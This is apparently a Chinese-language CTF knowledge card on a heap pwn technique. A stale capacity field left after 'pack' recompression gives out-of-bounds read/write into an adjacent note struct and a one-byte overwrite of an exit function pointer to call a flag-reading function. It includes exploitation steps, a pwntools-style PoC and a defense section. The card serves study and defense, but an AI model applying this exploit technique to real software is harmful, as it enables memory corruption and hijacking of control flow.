---
id: binary-pwn-heap-pack-stale-cap-oob-note-struct-function-pointer
title: pack 压缩后 stale cap：note data 缩小但 cap 未同步，show/edit 越界读写相邻 note 并改全局 exit 函数指针低字节
type: scenario
domain: binary
path: binary/pwn/heap
technique: pack-recompression-stale-capacity-oob-adjacent-struct-function-pointer
aliases:
- A-C
- pack stale cap
- 压缩后 cap 未更新
- note 结构体越界
- 相邻 note 覆盖
- close_archive 改 dump_flag
- 函数指针低字节覆盖
tags:
- pwn
- heap
- stale-capacity
- oob-read
- oob-write
- adjacent-object
- function-pointer
- low-byte-overwrite
- menu
- ctf
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V116
  verified_at: '2026-11-06T01:52:31+08:00'
  notes: 已对照原文 PWN A-C 一节核对：pack 后 data 缩小但 cap 保持 0x700、show(0) 越界泄露 NOTE1_MARK 定位 note1、edit(0) 改 note1 data/cap/len、show(1) 搜索 ./flag 定位 archive、archive+0x40 函数指针 close_archive(PIE+0x1311)→dump_flag(PIE+0x1330) 低字节 0x11→0x30、quit 触发读 flag 均一致；原文含 4 位大写 MD5 PoW，为题目环境细节。未验证点：PoC 未在本机复跑；frontmatter 无 sources/source_url。
---

## 一句话结论

菜单型堆题里，`pack` 把 note 的 data 重新压缩并分配到更小的 chunk，却没有同步更新 note 结构体里的 `cap`；后续 `show/edit` 仍按旧 `cap`（如 0x700）读写，形成对相邻 note 结构体的堆越界。攻击者先用 `show(0)` 越界泄露定位 note1，再用 `edit(0)` 改写 note1 的 `data/cap/len`，把 note1 的 data 指向全局 archive，最后只改 archive 退出函数指针的最低字节（`close_archive` 0x11 -> `dump_flag` 0x30），退出菜单即读 flag。

## 原理

- **stale capacity**：`pack` 会对 note 的 data 做重新压缩/重分配，数据变短、chunk 变小，但结构体里的 `cap` 字段仍保留压缩前的可用大小。`show/edit` 用 `cap` 做边界检查，于是允许读写超出新 chunk 的范围。
- **相邻对象布局**：堆上 note0 的 data 之后紧邻 note1 的结构体；`show(0)` 按旧 cap 读，能把 note1 的标题、data 指针、cap/len 一起泄露出来。用唯一标记 `NOTE1_MARK` 在泄露中搜索，比硬编码偏移稳定。
- **越界写改相邻结构体**：`edit(0)` 按旧 cap 写，可以覆盖 note1 的 `data/cap/len/title`；把 note1 的 data 指到任意地址、cap 设大，note1 就变成任意读写原语。
- **定位全局 archive**：把 note1 指向当前堆页，`show(1)` 后在泄露里搜索 `./flag\x00`，得到 archive 结构地址；archive 里保存 flag 路径和退出函数指针。
- **低字节覆盖**：`close_archive = PIE + 0x1311`、`dump_flag = PIE + 0x1330`，两者只差最低字节（0x11 -> 0x30）；把 note1 指向 `archive+0x40`，`edit(1, b"\x30")` 只改一个字节，避免破坏高字节/对齐。
- **触发**：选择 quit 时程序调用 archive 的退出函数指针，控制流从 `close_archive` 变成 `dump_flag(archive)`，后者读取 `./flag` 输出。

## 触发条件

- 程序提供 note 创建/编辑/展示/压缩/退出等菜单操作，note 结构体含 data 指针、cap/len 等字段。
- `pack`/压缩/重分配路径只更新 data 指针或长度，未同步更新 cap；`show/edit` 仍用旧 cap 做边界检查。
- 堆布局可预测或可通过标记泄露定位相邻 note；进程对 flag 文件有读权限（或 dump_flag 以足够权限读取）。
- 存在可覆盖的函数指针（全局 archive 的退出回调），且高低字节布局允许低字节覆盖到目标函数。

## 利用步骤

1. 创建 note0，申请 0x700 并写入重复数据；执行 `pack(0)`，data 缩小但 cap 仍为 0x700。
2. 创建 note1，标题写入唯一标记 `NOTE1_MARK`，data 写少量字节。
3. `show(0)` 按旧 cap 越界读，在泄露中搜索 `NOTE1_MARK`，`note1_off = 标记位置 - 0x18`，读取 note1 的 data 指针。
4. `edit(0)` 越界写，覆盖 note1 的 `cap/len/data/title`，把 note1 的 data 指到当前堆页、cap 设为 0x1000。
5. `show(1)` 读堆页，搜索 `./flag\x00` 得到 archive 地址；如 flag 路径不同，先改写 archive 中的路径字符串。
6. 把 note1 的 data 指向 `archive+0x40`，`edit(1, b"\x30")` 把退出函数指针最低字节从 0x11 改成 0x30。
7. 选择 quit，触发 `dump_flag(archive)` 读取 flag。

## PoC

关键步骤（按原文 exp 重写，偏移为原题示例，未在本库复跑）：

```python
# 1) stale cap
create(0, b"A", 0x700, b"B" * 0x700)
pack(0)

# 2) 相邻 note + 标记泄露
create(1, b"NOTE1_MARK", 0x20, b"D")
leak = get_hex(show(0))
note1_off = leak.index(b"NOTE1_MARK") - 0x18
data1 = u64(leak[note1_off + 0x10:note1_off + 0x18])

# 3) 越界写 note1 结构体
payload = flat({
    note1_off: p64(0x1000),          # cap
    note1_off + 0x8: p64(0x1000),    # len
    note1_off + 0x10: p64(data1 & ~0xfff),  # data -> 堆页
    note1_off + 0x18: b"NOTE1_MARK\x00",
}, filler=b"B")
edit(0, payload)

# 4) 找 archive
leak = get_hex(show(1))
archive = (data1 & ~0xfff) + leak.index(b"./flag\x00")

# 5) 低字节覆盖 close_archive -> dump_flag
set_note1_data(archive + 0x40, 8)
edit(1, b"\x30")

# 6) 退出触发
menu(6)
```

原文实测 `close_archive = PIE+0x1311`、`dump_flag = PIE+0x1330`，退出后读取 `./flag`；未在本库复跑。

## 变体与关联

- **stale 字段变体**：cap、len、size、capacity 任意一个在重分配后未同步；审计时对比“分配大小”和“结构体记录的可用大小”。
- **越界原语变体**：show 泄露、edit 写、free 越界；先用只读泄露定位相邻对象，再用写原语改指针/长度。
- **函数指针变体**：全局回调、vtable、GOT、exit hook；优先低字节覆盖，避免泄露完整地址/破坏对齐。
- **关联卡片**：[[binary-pwn-heap-uaf-function-pointer-hijack]]（UAF 函数指针劫持）、[[binary-pwn-heap-stale-slot-create-failure-uaf]]（stale 槽位/创建失败 UAF）、[[binary-pwn-heap-abs-intmin-length-bypass-bss-fake-chunk-tcache-got]]（长度检查绕过 + 伪造 chunk）。

## 检测与防御

- **状态同步**：任何重分配/压缩/扩容路径都必须同步更新结构体的 cap/len；不要让“记录的大小”与“实际 chunk 大小”不一致。
- **边界检查**：show/edit 使用实际分配大小或重新计算后的长度，不要信任旧 cap；对越小越好的操作做下界检查。
- **函数指针**：全局回调/退出函数指针放只读表或加指针认证；不要在可写结构体中保存可直接调用的函数地址。
- **编译加固**：开启 ASLR/PIE、Full RELRO、CFI；对关键结构体加 canary/完整性校验。
- **检测**：note 的 cap 与实际 chunk size 不一致、show/edit 读写范围超过分配大小、退出时函数指针指向非预期函数。
